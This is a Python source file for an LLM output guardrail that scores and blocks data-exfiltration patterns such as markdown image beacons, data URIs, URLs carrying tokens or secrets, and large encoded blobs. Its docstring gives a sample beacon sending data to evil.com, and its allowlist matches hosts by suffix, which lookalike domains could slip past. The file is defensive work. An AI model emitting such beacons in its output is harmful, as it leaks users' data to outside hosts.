# guardrail/layer5_output_filter/exfil_guard.py

import re
from typing import List, Tuple
from urllib.parse import urlparse
from .config import OutputFilterConfig, DEFAULT_CONFIG


class ExfiltrationGuard:
    """
    Detects data-exfiltration patterns in LLM output:
      - Markdown image beacons  ![x](https://evil.com?data=...)
      - Data URIs
      - Suspicious outbound URLs
      - Encoded blobs (base64/hex) above threshold
    """

    URL_RE = re.compile(r"https?://[^\s)\]\"'>]+", re.IGNORECASE)
    MD_IMAGE_RE = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")
    DATA_URI_RE = re.compile(r"data:[a-z]+/[a-z0-9.+-]+;base64,", re.IGNORECASE)
    B64_BLOB_RE = re.compile(r"\b[A-Za-z0-9+/]{200,}={0,2}\b")
    HEX_BLOB_RE = re.compile(r"\b(?:[0-9a-fA-F]{2}){100,}\b")

    def __init__(self, config: OutputFilterConfig = DEFAULT_CONFIG):
        self.cfg = config
        self.allowlist = set(config.EXFIL_URL_ALLOWLIST)

    # ------------------------------------------------------------------ #
    def scan(self, output: str, user_input: str = "") -> Tuple[float, List[str], List[str]]:
        """
        Returns (risk_score, reasons, blocked_urls).
        """
        if not output:
            return 0.0, [], []

        score = 0.0
        reasons: List[str] = []
        blocked: List[str] = []

        # ---- 1) Markdown image beacons ----
        if self.cfg.BLOCK_MARKDOWN_IMAGES:
            for m in self.MD_IMAGE_RE.finditer(output):
                url = m.group(1)
                if not self._is_allowed(url):
                    reasons.append("markdown_image_beacon")
                    blocked.append(url)
                    score = max(score, 0.9)

        # ---- 2) Data URIs ----
        if self.cfg.BLOCK_DATA_URIS and self.DATA_URI_RE.search(output):
            reasons.append("data_uri")
            score = max(score, 0.8)

        # ---- 3) Outbound URLs ----
        for m in self.URL_RE.finditer(output):
            url = m.group(0)
            if not self._is_allowed(url):
                # URL contains PII-ish query params?
                if re.search(r"[?&](data|token|key|secret|pii)=", url, re.I):
                    reasons.append("url_with_secrets")
                    blocked.append(url)
                    score = max(score, 0.95)
                else:
                    score = max(score, 0.4)

        # ---- 4) Encoded blobs ----
        if self.B64_BLOB_RE.search(output):
            reasons.append("large_base64_blob")
            score = max(score, 0.7)
        if self.HEX_BLOB_RE.search(output):
            reasons.append("large_hex_blob")
            score = max(score, 0.7)

        # ---- 5) Input correlation ----
        # If output contains a URL that appeared in user input, escalate
        if user_input:
            for m in self.URL_RE.finditer(output):
                if m.group(0) in user_input and not self._is_allowed(m.group(0)):
                    reasons.append("user_supplied_url_in_output")
                    score = max(score, 0.85)

        return score, list(set(reasons)), list(set(blocked))

    # ------------------------------------------------------------------ #
    def _is_allowed(self, url: str) -> bool:
        try:
            host = urlparse(url).hostname or ""
            return any(host.endswith(a) for a in self.allowlist)
        except Exception:
            return False